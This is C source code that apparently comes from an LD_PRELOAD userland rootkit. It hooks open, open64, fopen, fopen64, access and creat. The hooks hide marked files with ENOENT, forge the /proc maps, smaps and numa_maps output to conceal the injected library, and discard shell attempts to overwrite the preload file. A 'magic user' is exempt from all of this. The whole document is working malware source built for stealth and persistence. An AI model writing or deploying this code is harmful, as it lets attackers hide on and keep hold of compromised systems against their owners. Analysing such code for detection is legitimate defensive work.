/* open() */
int open(const char *pathname, int flags, mode_t mode){
    hook(o_open, "open");
    if(magic_user()) goto end_open;

    if(hxstat(pathname) && strstr(PRELOAD, pathname))
        if((strstr(cprocname(), "sh") || strstr(cprocname(), "busybox")))
            if(flags == (64|1|512))
                return o_open("/dev/null", flags, mode);

    if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX/2];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch("*/maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch("maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }

    if(hxstat(pathname)){
        errno = ENOENT;
        return -1;
    }

end_open:
    return o_open(pathname, flags, mode);
}
/* & open64() */
int open64(const char *pathname, int flags, mode_t mode){
    hook(o_open64, "open64");
    if(magic_user())
        goto end_open64;

    if(hxstat(pathname) && strstr(PRELOAD, pathname))
        if((strstr(cprocname(), "sh") || strstr(cprocname(), "busybox")))
            if(flags == (64|1|512))
                return o_open64("/dev/null", flags, mode);

    if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX/2];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch("*/maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch("maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }

    if(hxstat(pathname)){
        errno = ENOENT;
        return -1;
    }

end_open64:
    return o_open64(pathname, flags, mode);
}
/* fopen() */
FILE *fopen(const char *pathname, const char *mode){
    hook(o_fopen, "fopen");
    if(magic_user())
        goto end_fopen;

    if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME)) return forge_maps(pathname);
    if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME)) return forge_smaps(pathname);
    if(!fnmatch("/proc/*/numa_maps", pathname, FNM_PATHNAME)) return forge_numamaps(pathname);

    char cwd[PATH_MAX/2];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch("*/maps", pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch("*/smaps", pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch("*/numa_maps", pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch("maps", pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch("smaps", pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch("numa_maps", pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }
    }

    if(hxstat(pathname)){
        errno = ENOENT;
        return NULL;
    }
end_fopen:
    return o_fopen(pathname,mode);
}
/* & fopen64() */
FILE *fopen64(const char *pathname, const char *mode){
    hook(o_fopen64, "fopen64");
    if(magic_user())
        goto end_fopen64;

    if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME)) return forge_maps(pathname);
    if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME)) return forge_smaps(pathname);
    if(!fnmatch("/proc/*/numa_maps", pathname, FNM_PATHNAME)) return forge_numamaps(pathname);

    char cwd[PATH_MAX/2];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch("*/maps", pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch("*/smaps", pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch("*/numa_maps", pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch("maps", pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch("smaps", pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch("numa_maps", pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }
    }

    if(hxstat(pathname)){
        errno = ENOENT;
        return NULL;
    }
end_fopen64:
    return o_fopen64(pathname,mode);
}


int access(const char *pathname, int amode){
    hook(o_access, "access");
    if(magic_user()) return o_access(pathname,amode);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_access(pathname,amode);
}
int creat(const char *pathname, mode_t mode){
    hook(o_creat, "creat");
    if(magic_user()) return o_creat(pathname,mode);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_creat(pathname,mode);
}
